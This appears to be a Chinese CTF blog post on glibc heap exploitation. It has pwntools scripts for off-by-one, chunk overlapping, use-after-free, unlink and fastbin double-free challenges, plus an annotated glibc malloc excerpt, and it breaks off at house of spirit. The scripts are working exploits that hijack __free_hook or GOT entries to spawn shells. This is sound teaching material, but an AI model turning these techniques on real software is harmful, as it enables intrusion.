<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">binary = ELF(<span class="string">&quot;b00ks&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/l/how2heap/glibc-all-in-one/libs/2.21-0ubuntu4.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createbook</span>(<span class="params">name_size, name, des_size, des</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book name size: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name_size), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book description size: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(des_size), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter book description: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(des), <span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">id</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;ID: &quot;</span>)</span><br><span class="line">        book_id = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">        <span class="built_in">print</span>(book_id)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Name: &quot;</span>)</span><br><span class="line">        book_name = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_name)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Description: &quot;</span>)</span><br><span class="line">        book_des = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_des)</span><br><span class="line">        io.recvuntil(<span class="string">b&quot;Author: &quot;</span>)</span><br><span class="line">        book_author = io.recvline().strip()</span><br><span class="line">        <span class="built_in">print</span>(book_author)</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changename</span>(<span class="params">name</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Enter author name: &#x27;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(name).encode(<span class="string">&#x27;ascii&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editbook</span>(<span class="params">book_id, new_des</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>,book_id)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter new book description: &quot;</span>,new_des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletebook</span>(<span class="params">book_id</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Enter the book id you want to delete: &quot;</span>,<span class="built_in">bytes</span>(<span class="built_in">str</span>(book_id).encode(<span class="string">&#x27;ascii&#x27;</span>)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exitpro</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;6. Exit\n&gt; &quot;</span>, <span class="string">b&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Enter author name: &quot;</span>,<span class="number">32</span>*<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">createbook(<span class="string">&quot;32&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;272&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">createbook(<span class="string">&quot;135168&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="string">&quot;135168&quot;</span>,<span class="string">&quot;b&quot;</span>)</span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook([<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(book_author[<span class="number">32</span>:<span class="number">38</span>])</span><br><span class="line">book1_addr=u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;book1_address:&quot;</span>+<span class="built_in">hex</span>(book1_addr))</span><br><span class="line">p2vmmap = book1_addr+<span class="number">0x40</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(p2vmmap))</span><br><span class="line"></span><br><span class="line">payload=(<span class="number">0x58</span>+<span class="number">0x60</span>)*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x31</span>)+p64(<span class="number">0x1</span>)+p64(p2vmmap)+p64(p2vmmap)+p64(<span class="number">0x20</span>)</span><br><span class="line">editbook(<span class="string">b&#x27;1&#x27;</span>, payload)</span><br><span class="line">changename(<span class="string">&quot;A&quot;</span>*<span class="number">32</span>)</span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook([<span class="number">1</span>])</span><br><span class="line">book2_des_addr=u64(book_des.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base=book2_des_addr-<span class="number">0x5a3010</span></span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">sysbin = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.success(<span class="string">&quot;sysbin:&quot;</span>+<span class="built_in">hex</span>(sysbin))</span><br><span class="line">editbook(<span class="string">b&#x27;1&#x27;</span>,p64(free_hook))</span><br><span class="line">editbook(<span class="string">b&#x27;2&#x27;</span>,p64(sysbin))</span><br><span class="line">createbook(<span class="string">&quot;8&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">deletebook(<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="overslaping"><a href="#overslaping" class="headerlink" title="overslaping"></a>overslaping</h1><p><strong>和off-by-one有异曲同工之处，相同在，想方设法越权控制chunk字段，此方法就是将小chunk包含再大chunk之中，虽然我不能控制小chunk但是我可以控制大chunk进而控制小chunk，但是控制小chunk也是通过大chunk的某些字段实现，因此当更改小chunk某些字段之后，大chunk就失效了，因此只能利用一次，在一个地址处进行读写，此题是freegot</strong></p>
<p><strong>此题成功点在于fastbin的利用，fastbin的安全检查太少，链入链表只会检查和头是否重复，可以看出fastbin是一个用来攻击的破解点，需好好利用</strong></p>
<p><strong>此题的另一个重要漏洞是free参数的传递，其会直接传递用户指针，这样子参数就可控了</strong></p>
<p><strong>而想要控制大chunk包含小chunk需要溢出大chunk的size字段，使其可以包含小chunk</strong></p>
<p><strong>比较有意思的一点是假的chunk居然可以欺骗pwngdb，由此可以估计出pwngdb的实现就是通过简单的观察heap的相应字段实现的，哈哈哈哈</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/home/l/how2heap/glibc-all-in-one/libs/2.21-0ubuntu4.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    to create a chunk</span></span><br><span class="line"><span class="string">    size:bytes</span></span><br><span class="line"><span class="string">    content:bytes</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,size)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param index: bytes(0 begin)</span></span><br><span class="line"><span class="string">    :param content: bytes</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size : &quot;</span>)</span><br><span class="line">    size = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    <span class="built_in">print</span>(size)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Content : &quot;</span>)</span><br><span class="line">    content = io.recvline().strip()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">return</span> size,content</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;152&#x27;</span>,<span class="number">144</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x90</span>))</span><br><span class="line">create(<span class="string">b&#x27;24&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;c&#x27;</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">create(<span class="string">b&#x27;10&#x27;</span>,<span class="number">10</span>*<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="string">b&#x27;0&#x27;</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0x91</span>)+<span class="number">128</span>*<span class="string">b&#x27;b&#x27;</span>+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;\x71&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">freegot = pro.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(freegot))</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;104&#x27;</span>,<span class="number">24</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x70</span>)+p64(freegot)+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">size,content = show(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">freeadd = u64(content.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(size,<span class="built_in">hex</span>(freeadd))</span><br><span class="line">base = freeadd - elf.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">sysadd = elf.symbols[<span class="string">&#x27;system&#x27;</span>]+base</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,p64(sysadd))</span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#create(b&#x27;10&#x27;,10*b&#x27;c&#x27;)</span></span><br></pre></td></tr></table></figure>

<h1 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h1><p><strong>和前两者思路差不多基本上就是超越权限的指针访问，当指针free掉但是没有释放，那么低权限的用户再次使用可以更改高权限用户的数据，接着利用高权限的野指针可以访问到想访问到的东西</strong></p>
<p><strong>此题是hacknote，是一道教学题比较基础</strong></p>
<p><strong>py代码如下</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = remote(&quot;node5.buuoj.cn&quot;,29954)</span></span><br><span class="line">io = process(<span class="string">&quot;hacknote&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    to create a chunk</span></span><br><span class="line"><span class="string">    size:bytes</span></span><br><span class="line"><span class="string">    content:bytes</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Note size :&quot;</span>,size)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content :&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    content = io.recvline().strip()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">return</span> size,content</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line">create(<span class="string">b&#x27;12&#x27;</span>,p32(magic))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show(<span class="string">b&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>比较基础，原理不过多赘述，就是绕过指针检查，使chunk指针指向chunk地址的地址处，进而修改chunk的时候可以修改chunk指针达到任意地址写的目的，需要知道chunk指针的存储地址，也需要比较多的溢出量，以至于可以修改下一个chunk的prevsize字段和size字段。附上一道题目的py，<a href="https://buuoj.cn/challenges#hitcon2014_stkof">BUUCTF在线评测 (buuoj.cn)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26354</span>)</span><br><span class="line">elfp = ELF(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendline(size)</span><br><span class="line">    io.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendline(index)</span><br><span class="line">    io.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendline(index)</span><br><span class="line">    io.sendline(size)</span><br><span class="line">    io.send(content)</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line">num1 = create(<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">num2 = create(<span class="string">b&#x27;280&#x27;</span>)</span><br><span class="line"></span><br><span class="line">num3 = create(<span class="string">b&#x27;280&#x27;</span>)</span><br><span class="line">fd = <span class="number">0x602150</span>-<span class="number">0x18</span></span><br><span class="line">bk = <span class="number">0x602150</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">edit(<span class="string">b&#x27;2&#x27;</span>,<span class="string">b&#x27;288&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x111</span>)+p64(fd)+p64(bk)+<span class="number">0xf0</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x120</span>))</span><br><span class="line">de(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">putplt = elfp.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">putgot = elfp.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">freeplt = elfp.plt[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">atoiplt = elfp.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">freegot = elfp.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(putgot))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(freeplt))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(atoiplt))</span><br><span class="line">edit(<span class="string">b&#x27;2&#x27;</span>,<span class="string">b&#x27;112&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(putgot)+p64(freegot)+p64(<span class="number">0x602158</span>)+<span class="number">5</span>*(<span class="string">b&#x27;cat ./flag&#x27;</span>+<span class="number">6</span>*<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,p64(putplt))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">putadd = u64(io.recv()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_puts = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">base = putadd - libc_puts</span><br><span class="line">system = base +libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,p64(system))</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#io.sendline(&quot;cat flag&quot;)</span></span><br><span class="line">io.recv()</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.recv()</span></span><br></pre></td></tr></table></figure>

<h1 id="double-free"><a href="#double-free" class="headerlink" title="double_free"></a>double_free</h1><p>注意一系列的检查吧，搞笑的是检查size的时候居然只看低4字节，因此可以通过hex表找可以伪造堆块的位置，其余的便没了。基本思想就是可以控制free掉的堆块进而改变fd指针，进而可以malloc的任意位置，以ISCC218–Write Some Paper为例，还有比较重要的是，低版本的堆fasbin没有地址对齐检查，否则就不好利用了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./paper&quot;</span>)</span><br><span class="line">io =process(<span class="string">&quot;./paper&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;2 delete paper\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the index you want to store(0-9):&quot;</span>,index)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;How long you will enter:&quot;</span>,size)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please enter your content:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;2 delete paper\n&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;which paper you want to delete,please enter it&#x27;s index(0-9):&quot;</span>,index)</span><br><span class="line">create(<span class="string">b&#x27;0&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;2&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">de(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">de(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">de(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">mallocadd = <span class="number">0x0000000000602032</span></span><br><span class="line">sysadd = <span class="number">0x0000000000400943</span></span><br><span class="line">create(<span class="string">b&#x27;3&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,p64(mallocadd))</span><br><span class="line">create(<span class="string">b&#x27;4&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;5&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;6&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">22</span>*<span class="string">b&#x27;a&#x27;</span>+p64(sysadd))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;2 delete paper\n&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h1><blockquote>
<p>以<a href="https://buuoj.cn/challenges#lctf2016_pwn200">lctf2016_pwn200</a>为例子</p>
</blockquote>
<h2 id="fastbin绕过思路"><a href="#fastbin绕过思路" class="headerlink" title="fastbin绕过思路"></a>fastbin绕过思路</h2><ul>
<li>chunk地址对齐，此题对应的libc貌似不用考虑，没有试过。</li>
<li>size对齐（一般以2*size_t）</li>
<li>next_size检查，本题目主要检查尺寸范围</li>
<li>具体libc具体分析，可以查看malloc.c的源码</li>
</ul>
<blockquote>
<p>此处以glibc2.35为例</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim))) <span class="comment">//地址对齐检查，低版本好像没有</span></span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">	    *fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    REMOVE_FB (fb, pp, victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);<span class="comment">//chunksize检查</span></span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);<span class="comment">//debug模式调试所用，不用关心</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">	      <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">			malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="本题思路"><a href="#本题思路" class="headerlink" title="本题思路"></a>本题思路</h2><blockquote>
<p>1.利用printf的基址泄露rbp的值。</p>
